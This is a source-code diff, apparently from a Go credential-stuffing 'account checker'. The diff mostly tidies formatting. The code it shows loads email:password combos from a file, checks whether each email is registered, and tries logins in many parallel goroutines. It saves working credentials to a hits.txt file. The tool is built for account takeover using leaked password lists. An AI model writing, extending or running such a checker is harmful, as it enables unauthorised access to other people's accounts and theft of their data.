@@ -21,10 +21,8 @@ var (
 	// Counter Variables
 	hitCount, errorCount int   = 0, 0
 	totalRequests        int64 = 1
-
 	// Amount of accounts in combos.txt
 	accountCount int64 = Global.FileNewLineCount("data/account_checker/combos.txt")
-
 	// Account Combos Queue
 	AccountQueue *Queue.ItemQueue = Global.AddToQueue(Queue.Create(), "data/account_checker/combos.txt")
 )
@@ -47,7 +45,6 @@ func CreateRequestObject(auth string) *fasthttp.Request {
 	var (
 		// Create the request object
 		req *fasthttp.Request = Global.SetRequest("POST")
-
 		// Marshal the body being sent in the request
 		data, _ = json.Marshal(map[string]interface{}{"rememberMe": false})
 	)
@@ -72,13 +69,10 @@ func HandleValidateResponse(RequestClient *fasthttp.Client, account string) {
 	var (
 		// Base64 the account email:password
 		auth string = base64.StdEncoding.EncodeToString([]byte(account))
-
 		// Create the request object
 		req *fasthttp.Request = CreateRequestObject(auth)
-
 		// Create the response object
 		resp *fasthttp.Response = Global.SetResponse(false)
-
 		// Send the http request
 		err error = RequestClient.DoTimeout(req, resp, time.Second*6)
 	)
@@ -90,12 +84,10 @@ func HandleValidateResponse(RequestClient *fasthttp.Client, account string) {
 
 	// If no errors occured and the response status code is 200 (success)
 	if resp.StatusCode() == 200 && err == nil {
-
 		// Write the combo to the hits.txt file
 		go Global.WriteToFile("data/account_checker/hits.txt", &account)
 		hitCount++
 	} else {
-
 		// Set the current error if the error isn't nil
 		// and the status code doesn't equal 401 (invalid credentials code)
 		if err != nil || resp.StatusCode() != 401 {
@@ -111,10 +103,8 @@ func HandleValidateResponse(RequestClient *fasthttp.Client, account string) {
 // in a goroutine for logging into the account
 func HandleEmailCheckResponse(RequestClient *fasthttp.Client, account string, resp *fasthttp.Response, err error) {
 	totalRequests++
-
 	// If the error is nil and the status code is 200 (success)
 	if err == nil && resp.StatusCode() == 200 {
-
 		// Check if the response body contains the string
 		// determining whether the email is already registered
 		var body string = string(resp.Body())
@@ -123,9 +113,9 @@ func HandleEmailCheckResponse(RequestClient *fasthttp.Client, account string, re
 			go HandleValidateResponse(RequestClient, account)
 			return
 		}
-	} else {
-
-		// Set the current error and increase the error count
+	} else
+	// Set the current error and increase the error count
+	{
 		Global.CurrentError = fmt.Sprintf(" >> Email Check Error: %d: %v: %s", resp.StatusCode(), err, string(resp.Body()))
 		errorCount++
 	}
@@ -142,7 +132,6 @@ func Start(threadCount int) {
 	var (
 		// Used for tracking requests per second
 		programStartTime int64 = time.Now().Unix()
-
 		// Wait group for goroutines
 		waitGroup sync.WaitGroup = sync.WaitGroup{}
 	)
@@ -150,7 +139,6 @@ func Start(threadCount int) {
 
 	// Iterate over the threadCount
 	for i := 0; i < threadCount; i++ {
-
 		// Run everything below in a goroutine
 		go func() {
 			// Request Client for sending http requests
@@ -165,8 +153,7 @@ func Start(threadCount int) {
 					// Define Variables
 					var (
 						// Get the combo from the account queue
-						account string = fmt.Sprint(*AccountQueue.Grab())
-
+						account string = (*AccountQueue.Grab()).(string)
 						// Send the validation request using the request client and email
 						resp, err = Global.AccountValidationRequest(RequestClient, strings.Split(account, ":")[0])
 					)
